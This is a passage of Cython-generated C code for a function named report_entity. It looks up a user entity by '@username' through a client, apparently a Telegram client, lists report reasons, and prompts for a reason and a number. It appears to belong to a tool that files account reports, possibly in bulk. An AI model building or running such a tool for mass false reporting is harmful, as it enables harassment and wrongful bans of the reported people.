      __pyx_t_1 = __Pyx_PyObject_CallNoArg(__pyx_builtin_print); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 175, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

      
      __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_cur_scope->__pyx_v_entity_username, __pyx_n_s_startswith); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 177, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_3);
      __pyx_t_14 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_3))) {
        __pyx_t_14 = PyMethod_GET_SELF(__pyx_t_3);
        if (likely(__pyx_t_14)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
          __Pyx_INCREF(__pyx_t_14);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_3, function);
        }
      }
      __pyx_t_1 = (__pyx_t_14) ? __Pyx_PyObject_Call2Args(__pyx_t_3, __pyx_t_14, __pyx_kp_u__21) : __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_kp_u__21);
      __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
      if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 177, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      __pyx_t_5 = __Pyx_PyObject_IsTrue(__pyx_t_1); if (unlikely(__pyx_t_5 < 0)) __PYX_ERR(0, 177, __pyx_L1_error)
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
      __pyx_t_10 = ((!__pyx_t_5) != 0);
      if (__pyx_t_10) {

        
        __pyx_t_1 = PyNumber_Add(__pyx_kp_u__21, __pyx_cur_scope->__pyx_v_entity_username); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 178, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_GOTREF(__pyx_cur_scope->__pyx_v_entity_username);
        __Pyx_DECREF_SET(__pyx_cur_scope->__pyx_v_entity_username, __pyx_t_1);
        __Pyx_GIVEREF(__pyx_t_1);
        __pyx_t_1 = 0;

        
      }

      
      {
        __Pyx_ExceptionSave(&__pyx_t_8, &__pyx_t_7, &__pyx_t_6);
        __Pyx_XGOTREF(__pyx_t_8);
        __Pyx_XGOTREF(__pyx_t_7);
        __Pyx_XGOTREF(__pyx_t_6);
        /*try:*/ {

          
          __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_cur_scope->__pyx_v_client, __pyx_n_s_get_entity); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 181, __pyx_L46_error)
          __Pyx_GOTREF(__pyx_t_3);
          __pyx_t_14 = NULL;
          if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_3))) {
            __pyx_t_14 = PyMethod_GET_SELF(__pyx_t_3);
            if (likely(__pyx_t_14)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
              __Pyx_INCREF(__pyx_t_14);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_3, function);
            }
          }
          __pyx_t_1 = (__pyx_t_14) ? __Pyx_PyObject_Call2Args(__pyx_t_3, __pyx_t_14, __pyx_cur_scope->__pyx_v_entity_username) : __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_cur_scope->__pyx_v_entity_username);
          __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
          if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 181, __pyx_L46_error)
          __Pyx_GOTREF(__pyx_t_1);
          __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
          __pyx_r = __Pyx_Coroutine_Yield_From(__pyx_generator, __pyx_t_1);
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
          __Pyx_XGOTREF(__pyx_r);
          if (likely(__pyx_r)) {
            __Pyx_XGIVEREF(__pyx_t_6);
            __pyx_cur_scope->__pyx_t_0 = __pyx_t_6;
            __Pyx_XGIVEREF(__pyx_t_7);
            __pyx_cur_scope->__pyx_t_1 = __pyx_t_7;
            __Pyx_XGIVEREF(__pyx_t_8);
            __pyx_cur_scope->__pyx_t_2 = __pyx_t_8;
            __Pyx_XGIVEREF(__pyx_r);
            __Pyx_RefNannyFinishContext();
            __Pyx_Coroutine_ResetAndClearException(__pyx_generator);
            /* return from generator, awaiting value */
            __pyx_generator->resume_label = 3;
            return __pyx_r;
            __pyx_L54_resume_from_await:;
            __pyx_t_6 = __pyx_cur_scope->__pyx_t_0;
            __pyx_cur_scope->__pyx_t_0 = 0;
            __Pyx_XGOTREF(__pyx_t_6);
            __pyx_t_7 = __pyx_cur_scope->__pyx_t_1;
            __pyx_cur_scope->__pyx_t_1 = 0;
            __Pyx_XGOTREF(__pyx_t_7);
            __pyx_t_8 = __pyx_cur_scope->__pyx_t_2;
            __pyx_cur_scope->__pyx_t_2 = 0;
            __Pyx_XGOTREF(__pyx_t_8);
            if (unlikely(!__pyx_sent_value)) __PYX_ERR(0, 181, __pyx_L46_error)
            __pyx_t_1 = __pyx_sent_value; __Pyx_INCREF(__pyx_t_1);
          } else {
            __pyx_t_1 = NULL;
            if (__Pyx_PyGen_FetchStopIterationValue(&__pyx_t_1) < 0) __PYX_ERR(0, 181, __pyx_L46_error)
            __Pyx_GOTREF(__pyx_t_1);
          }
          __Pyx_XGOTREF(__pyx_cur_scope->__pyx_v_entity);
          __Pyx_XDECREF_SET(__pyx_cur_scope->__pyx_v_entity, __pyx_t_1);
          __Pyx_GIVEREF(__pyx_t_1);
          __pyx_t_1 = 0;

          
        }
        __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
        __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
        __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
        goto __pyx_L53_try_end;
        __pyx_L46_error:;
        __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
        __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
        __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;
        __Pyx_XDECREF(__pyx_t_19); __pyx_t_19 = 0;
        __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
        __Pyx_XDECREF(__pyx_t_21); __pyx_t_21 = 0;
        __Pyx_XDECREF(__pyx_t_22); __pyx_t_22 = 0;
        __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;

        
        __pyx_t_13 = __Pyx_PyErr_ExceptionMatches(((PyObject *)(&((PyTypeObject*)PyExc_Exception)[0])));
        if (__pyx_t_13) {
          __Pyx_AddTraceback("source.report_entity", __pyx_clineno, __pyx_lineno, __pyx_filename);
          if (__Pyx_GetException(&__pyx_t_1, &__pyx_t_3, &__pyx_t_14) < 0) __PYX_ERR(0, 182, __pyx_L48_except_error)
          __Pyx_GOTREF(__pyx_t_1);
          __Pyx_GOTREF(__pyx_t_3);
          __Pyx_GOTREF(__pyx_t_14);
          __Pyx_INCREF(__pyx_t_3);
          __Pyx_GIVEREF(__pyx_t_3);
          __pyx_cur_scope->__pyx_v_e = __pyx_t_3;
          /*try:*/ {

            
            __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_colored); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 183, __pyx_L60_error)
            __Pyx_GOTREF(__pyx_t_2);
            __pyx_t_22 = PyTuple_New(3); if (unlikely(!__pyx_t_22)) __PYX_ERR(0, 183, __pyx_L60_error)
            __Pyx_GOTREF(__pyx_t_22);
            __pyx_t_11 = 0;
            __pyx_t_18 = 127;
            __Pyx_INCREF(__pyx_kp_u_Error_retrieving_entity);
            __pyx_t_11 += 25;
            __Pyx_GIVEREF(__pyx_kp_u_Error_retrieving_entity);
            PyTuple_SET_ITEM(__pyx_t_22, 0, __pyx_kp_u_Error_retrieving_entity);
            __pyx_t_15 = __Pyx_PyObject_FormatSimple(__pyx_cur_scope->__pyx_v_e, __pyx_empty_unicode); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 183, __pyx_L60_error)
            __Pyx_GOTREF(__pyx_t_15);
            __pyx_t_18 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_15) > __pyx_t_18) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_15) : __pyx_t_18;
            __pyx_t_11 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_15);
            __Pyx_GIVEREF(__pyx_t_15);
            PyTuple_SET_ITEM(__pyx_t_22, 1, __pyx_t_15);
            __pyx_t_15 = 0;
            __Pyx_INCREF(__pyx_kp_u__19);
            __pyx_t_11 += 1;
            __Pyx_GIVEREF(__pyx_kp_u__19);
            PyTuple_SET_ITEM(__pyx_t_22, 2, __pyx_kp_u__19);
            __pyx_t_15 = __Pyx_PyUnicode_Join(__pyx_t_22, 3, __pyx_t_11, __pyx_t_18); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 183, __pyx_L60_error)
            __Pyx_GOTREF(__pyx_t_15);
            __Pyx_DECREF(__pyx_t_22); __pyx_t_22 = 0;
            __pyx_t_22 = NULL;
            __pyx_t_13 = 0;
            if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_2))) {
              __pyx_t_22 = PyMethod_GET_SELF(__pyx_t_2);
              if (likely(__pyx_t_22)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
                __Pyx_INCREF(__pyx_t_22);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_2, function);
                __pyx_t_13 = 1;
              }
            }
            #if CYTHON_FAST_PYCALL
            if (PyFunction_Check(__pyx_t_2)) {
              PyObject *__pyx_temp[3] = {__pyx_t_22, __pyx_t_15, __pyx_n_u_red};
              __pyx_t_19 = __Pyx_PyFunction_FastCall(__pyx_t_2, __pyx_temp+1-__pyx_t_13, 2+__pyx_t_13); if (unlikely(!__pyx_t_19)) __PYX_ERR(0, 183, __pyx_L60_error)
              __Pyx_XDECREF(__pyx_t_22); __pyx_t_22 = 0;
              __Pyx_GOTREF(__pyx_t_19);
              __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;
            } else
            #endif
            #if CYTHON_FAST_PYCCALL
            if (__Pyx_PyFastCFunction_Check(__pyx_t_2)) {
              PyObject *__pyx_temp[3] = {__pyx_t_22, __pyx_t_15, __pyx_n_u_red};
              __pyx_t_19 = __Pyx_PyCFunction_FastCall(__pyx_t_2, __pyx_temp+1-__pyx_t_13, 2+__pyx_t_13); if (unlikely(!__pyx_t_19)) __PYX_ERR(0, 183, __pyx_L60_error)
              __Pyx_XDECREF(__pyx_t_22); __pyx_t_22 = 0;
              __Pyx_GOTREF(__pyx_t_19);
              __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;
            } else
            #endif
            {
              __pyx_t_21 = PyTuple_New(2+__pyx_t_13); if (unlikely(!__pyx_t_21)) __PYX_ERR(0, 183, __pyx_L60_error)
              __Pyx_GOTREF(__pyx_t_21);
              if (__pyx_t_22) {
                __Pyx_GIVEREF(__pyx_t_22); PyTuple_SET_ITEM(__pyx_t_21, 0, __pyx_t_22); __pyx_t_22 = NULL;
              }
              __Pyx_GIVEREF(__pyx_t_15);
              PyTuple_SET_ITEM(__pyx_t_21, 0+__pyx_t_13, __pyx_t_15);
              __Pyx_INCREF(__pyx_n_u_red);
              __Pyx_GIVEREF(__pyx_n_u_red);
              PyTuple_SET_ITEM(__pyx_t_21, 1+__pyx_t_13, __pyx_n_u_red);
              __pyx_t_15 = 0;
              __pyx_t_19 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_t_21, NULL); if (unlikely(!__pyx_t_19)) __PYX_ERR(0, 183, __pyx_L60_error)
              __Pyx_GOTREF(__pyx_t_19);
              __Pyx_DECREF(__pyx_t_21); __pyx_t_21 = 0;
            }
            __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
            __pyx_t_2 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_19); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 183, __pyx_L60_error)
            __Pyx_GOTREF(__pyx_t_2);
            __Pyx_DECREF(__pyx_t_19); __pyx_t_19 = 0;
            __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

            
            goto __pyx_L57_continue;
          }

          
          /*finally:*/ {
            __pyx_L60_error:;
            /*exception exit:*/{
              __Pyx_PyThreadState_assign
              __pyx_t_29 = 0; __pyx_t_28 = 0; __pyx_t_27 = 0; __pyx_t_26 = 0; __pyx_t_25 = 0; __pyx_t_24 = 0;
              __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;
              __Pyx_XDECREF(__pyx_t_19); __pyx_t_19 = 0;
              __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
              __Pyx_XDECREF(__pyx_t_21); __pyx_t_21 = 0;
              __Pyx_XDECREF(__pyx_t_22); __pyx_t_22 = 0;
              if (PY_MAJOR_VERSION >= 3) __Pyx_ExceptionSwap(&__pyx_t_26, &__pyx_t_25, &__pyx_t_24);
              if ((PY_MAJOR_VERSION < 3) || unlikely(__Pyx_GetException(&__pyx_t_29, &__pyx_t_28, &__pyx_t_27) < 0)) __Pyx_ErrFetch(&__pyx_t_29, &__pyx_t_28, &__pyx_t_27);
              __Pyx_XGOTREF(__pyx_t_29);
              __Pyx_XGOTREF(__pyx_t_28);
              __Pyx_XGOTREF(__pyx_t_27);
              __Pyx_XGOTREF(__pyx_t_26);
              __Pyx_XGOTREF(__pyx_t_25);
              __Pyx_XGOTREF(__pyx_t_24);
              __pyx_t_13 = __pyx_lineno; __pyx_t_12 = __pyx_clineno; __pyx_t_30 = __pyx_filename;
              {
                __Pyx_GOTREF(__pyx_cur_scope->__pyx_v_e);
                __Pyx_DECREF(__pyx_cur_scope->__pyx_v_e);
                __pyx_cur_scope->__pyx_v_e = NULL;
              }
              if (PY_MAJOR_VERSION >= 3) {
                __Pyx_XGIVEREF(__pyx_t_26);
                __Pyx_XGIVEREF(__pyx_t_25);
                __Pyx_XGIVEREF(__pyx_t_24);
                __Pyx_ExceptionReset(__pyx_t_26, __pyx_t_25, __pyx_t_24);
              }
              __Pyx_XGIVEREF(__pyx_t_29);
              __Pyx_XGIVEREF(__pyx_t_28);
              __Pyx_XGIVEREF(__pyx_t_27);
              __Pyx_ErrRestore(__pyx_t_29, __pyx_t_28, __pyx_t_27);
              __pyx_t_29 = 0; __pyx_t_28 = 0; __pyx_t_27 = 0; __pyx_t_26 = 0; __pyx_t_25 = 0; __pyx_t_24 = 0;
              __pyx_lineno = __pyx_t_13; __pyx_clineno = __pyx_t_12; __pyx_filename = __pyx_t_30;
              goto __pyx_L48_except_error;
            }
            __pyx_L57_continue: {
              __Pyx_GOTREF(__pyx_cur_scope->__pyx_v_e);
              __Pyx_DECREF(__pyx_cur_scope->__pyx_v_e);
              __pyx_cur_scope->__pyx_v_e = NULL;
              goto __pyx_L56_except_continue;
            }
          }
          __pyx_L56_except_continue:;
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
          __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
          __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
          goto __pyx_L52_try_continue;
        }
        goto __pyx_L48_except_error;
        __pyx_L48_except_error:;

        
        __Pyx_XGIVEREF(__pyx_t_8);
        __Pyx_XGIVEREF(__pyx_t_7);
        __Pyx_XGIVEREF(__pyx_t_6);
        __Pyx_ExceptionReset(__pyx_t_8, __pyx_t_7, __pyx_t_6);
        goto __pyx_L1_error;
        __pyx_L52_try_continue:;
        __Pyx_XGIVEREF(__pyx_t_8);
        __Pyx_XGIVEREF(__pyx_t_7);
        __Pyx_XGIVEREF(__pyx_t_6);
        __Pyx_ExceptionReset(__pyx_t_8, __pyx_t_7, __pyx_t_6);
        goto __pyx_L4_continue;
        __pyx_L53_try_end:;
      }

      
      __Pyx_GetModuleGlobalName(__pyx_t_14, __pyx_n_s_colored); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 186, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_14);
      __pyx_t_3 = __Pyx_PyObject_Call(__pyx_t_14, __pyx_tuple__14, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 186, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_3);
      __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
      __pyx_t_14 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_3); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 186, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_14);
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;

      
      __pyx_t_11 = 0;
      __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_report_reasons); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 187, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_3);
      if (unlikely(__pyx_t_3 == Py_None)) {
        PyErr_Format(PyExc_AttributeError, "'NoneType' object has no attribute '%.30s'", "items");
        __PYX_ERR(0, 187, __pyx_L1_error)
      }
      __pyx_t_1 = __Pyx_dict_iterator(__pyx_t_3, 0, __pyx_n_s_items, (&__pyx_t_9), (&__pyx_t_12)); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 187, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      __Pyx_XDECREF(__pyx_t_14);
      __pyx_t_14 = __pyx_t_1;
      __pyx_t_1 = 0;
      while (1) {
        __pyx_t_13 = __Pyx_dict_iter_next(__pyx_t_14, __pyx_t_9, &__pyx_t_11, &__pyx_t_1, &__pyx_t_3, NULL, __pyx_t_12);
        if (unlikely(__pyx_t_13 == 0)) break;
        if (unlikely(__pyx_t_13 == -1)) __PYX_ERR(0, 187, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_GOTREF(__pyx_t_3);
        __Pyx_XGOTREF(__pyx_cur_scope->__pyx_v_number);
        __Pyx_XDECREF_SET(__pyx_cur_scope->__pyx_v_number, __pyx_t_1);
        __Pyx_GIVEREF(__pyx_t_1);
        __pyx_t_1 = 0;
        if ((likely(PyTuple_CheckExact(__pyx_t_3))) || (PyList_CheckExact(__pyx_t_3))) {
          PyObject* sequence = __pyx_t_3;
          Py_ssize_t size = __Pyx_PySequence_SIZE(sequence);
          if (unlikely(size != 2)) {
            if (size > 2) __Pyx_RaiseTooManyValuesError(2);
            else if (size >= 0) __Pyx_RaiseNeedMoreValuesError(size);
            __PYX_ERR(0, 187, __pyx_L1_error)
          }
          #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
          if (likely(PyTuple_CheckExact(sequence))) {
            __pyx_t_1 = PyTuple_GET_ITEM(sequence, 0); 
            __pyx_t_2 = PyTuple_GET_ITEM(sequence, 1); 
          } else {
            __pyx_t_1 = PyList_GET_ITEM(sequence, 0); 
            __pyx_t_2 = PyList_GET_ITEM(sequence, 1); 
          }
          __Pyx_INCREF(__pyx_t_1);
          __Pyx_INCREF(__pyx_t_2);
          #else
          __pyx_t_1 = PySequence_ITEM(sequence, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 187, __pyx_L1_error)
          __Pyx_GOTREF(__pyx_t_1);
          __pyx_t_2 = PySequence_ITEM(sequence, 1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 187, __pyx_L1_error)
          __Pyx_GOTREF(__pyx_t_2);
          #endif
          __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        } else {
          Py_ssize_t index = -1;
          __pyx_t_19 = PyObject_GetIter(__pyx_t_3); if (unlikely(!__pyx_t_19)) __PYX_ERR(0, 187, __pyx_L1_error)
          __Pyx_GOTREF(__pyx_t_19);
          __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
          __pyx_t_16 = Py_TYPE(__pyx_t_19)->tp_iternext;
          index = 0; __pyx_t_1 = __pyx_t_16(__pyx_t_19); if (unlikely(!__pyx_t_1)) goto __pyx_L68_unpacking_failed;
          __Pyx_GOTREF(__pyx_t_1);
          index = 1; __pyx_t_2 = __pyx_t_16(__pyx_t_19); if (unlikely(!__pyx_t_2)) goto __pyx_L68_unpacking_failed;
          __Pyx_GOTREF(__pyx_t_2);
          if (__Pyx_IternextUnpackEndCheck(__pyx_t_16(__pyx_t_19), 2) < 0) __PYX_ERR(0, 187, __pyx_L1_error)
          __pyx_t_16 = NULL;
          __Pyx_DECREF(__pyx_t_19); __pyx_t_19 = 0;
          goto __pyx_L69_unpacking_done;
          __pyx_L68_unpacking_failed:;
          __Pyx_DECREF(__pyx_t_19); __pyx_t_19 = 0;
          __pyx_t_16 = NULL;
          if (__Pyx_IterFinish() == 0) __Pyx_RaiseNeedMoreValuesError(index);
          __PYX_ERR(0, 187, __pyx_L1_error)
          __pyx_L69_unpacking_done:;
        }
        __Pyx_XGOTREF(__pyx_cur_scope->__pyx_v_reason_name);
        __Pyx_XDECREF_SET(__pyx_cur_scope->__pyx_v_reason_name, __pyx_t_1);
        __Pyx_GIVEREF(__pyx_t_1);
        __pyx_t_1 = 0;
        __Pyx_XGOTREF(__pyx_cur_scope->__pyx_v__);
        __Pyx_XDECREF_SET(__pyx_cur_scope->__pyx_v__, __pyx_t_2);
        __Pyx_GIVEREF(__pyx_t_2);
        __pyx_t_2 = 0;

        
        __pyx_t_3 = PyTuple_New(3); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 188, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_3);
        __pyx_t_17 = 0;
        __pyx_t_18 = 127;
        __pyx_t_2 = __Pyx_PyObject_FormatSimple(__pyx_cur_scope->__pyx_v_number, __pyx_empty_unicode); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 188, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_2);
        __pyx_t_18 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) > __pyx_t_18) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) : __pyx_t_18;
        __pyx_t_17 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_2);
        __Pyx_GIVEREF(__pyx_t_2);
        PyTuple_SET_ITEM(__pyx_t_3, 0, __pyx_t_2);
        __pyx_t_2 = 0;
        __Pyx_INCREF(__pyx_kp_u__15);
        __pyx_t_17 += 2;
        __Pyx_GIVEREF(__pyx_kp_u__15);
        PyTuple_SET_ITEM(__pyx_t_3, 1, __pyx_kp_u__15);
        __pyx_t_2 = __Pyx_PyObject_FormatSimple(__pyx_cur_scope->__pyx_v_reason_name, __pyx_empty_unicode); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 188, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_2);
        __pyx_t_18 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) > __pyx_t_18) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) : __pyx_t_18;
        __pyx_t_17 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_2);
        __Pyx_GIVEREF(__pyx_t_2);
        PyTuple_SET_ITEM(__pyx_t_3, 2, __pyx_t_2);
        __pyx_t_2 = 0;
        __pyx_t_2 = __Pyx_PyUnicode_Join(__pyx_t_3, 3, __pyx_t_17, __pyx_t_18); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 188, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_2);
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        __pyx_t_3 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 188, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_3);
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      }
      __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;

      
      __pyx_t_14 = __Pyx_PyObject_CallNoArg(__pyx_builtin_print); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 189, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_14);
      __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;

      
      __Pyx_GetModuleGlobalName(__pyx_t_14, __pyx_n_s_get_valid_input); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 191, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_14);

      
      __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_colored); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 192, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_3);
      __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_tuple__16, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 192, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

      
      __pyx_t_3 = PyTuple_New(1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 191, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_3);
      __Pyx_GIVEREF(__pyx_t_2);
      PyTuple_SET_ITEM(__pyx_t_3, 0, __pyx_t_2);
      __pyx_t_2 = 0;

      
      __pyx_t_2 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 195, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_GetModuleGlobalName(__pyx_t_19, __pyx_n_s_report_reasons); if (unlikely(!__pyx_t_19)) __PYX_ERR(0, 195, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_19);
      __pyx_t_21 = __Pyx_PyObject_GetAttrStr(__pyx_t_19, __pyx_n_s_keys); if (unlikely(!__pyx_t_21)) __PYX_ERR(0, 195, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_21);
      __Pyx_DECREF(__pyx_t_19); __pyx_t_19 = 0;
      __pyx_t_19 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_21))) {
        __pyx_t_19 = PyMethod_GET_SELF(__pyx_t_21);
        if (likely(__pyx_t_19)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_21);
          __Pyx_INCREF(__pyx_t_19);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_21, function);
        }
      }
      __pyx_t_1 = (__pyx_t_19) ? __Pyx_PyObject_CallOneArg(__pyx_t_21, __pyx_t_19) : __Pyx_PyObject_CallNoArg(__pyx_t_21);
      __Pyx_XDECREF(__pyx_t_19); __pyx_t_19 = 0;
      if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 195, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_DECREF(__pyx_t_21); __pyx_t_21 = 0;
      if (PyDict_SetItem(__pyx_t_2, __pyx_n_s_valid_options, __pyx_t_1) < 0) __PYX_ERR(0, 195, __pyx_L1_error)
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

      
      __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_14, __pyx_t_3, __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 191, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
      __Pyx_XGOTREF(__pyx_cur_scope->__pyx_v_reason_choice);
      __Pyx_XDECREF_SET(__pyx_cur_scope->__pyx_v_reason_choice, __pyx_t_1);
      __Pyx_GIVEREF(__pyx_t_1);
      __pyx_t_1 = 0;

      
      __pyx_t_10 = (__Pyx_PyUnicode_Equals(__pyx_cur_scope->__pyx_v_reason_choice, __pyx_n_u_home, Py_EQ)); if (unlikely(__pyx_t_10 < 0)) __PYX_ERR(0, 196, __pyx_L1_error)
      if (__pyx_t_10) {

        
        goto __pyx_L4_continue;

        
      }

      
      __pyx_t_1 = __Pyx_PyObject_CallNoArg(__pyx_builtin_print); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 199, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

      
      __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_get_valid_integer_input); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 201, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_2);

      
      __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_colored); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 202, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_3);
      __pyx_t_14 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_tuple__17, NULL); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 202, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_14);
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      __pyx_t_3 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_2))) {
        __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_2);
        if (likely(__pyx_t_3)) {
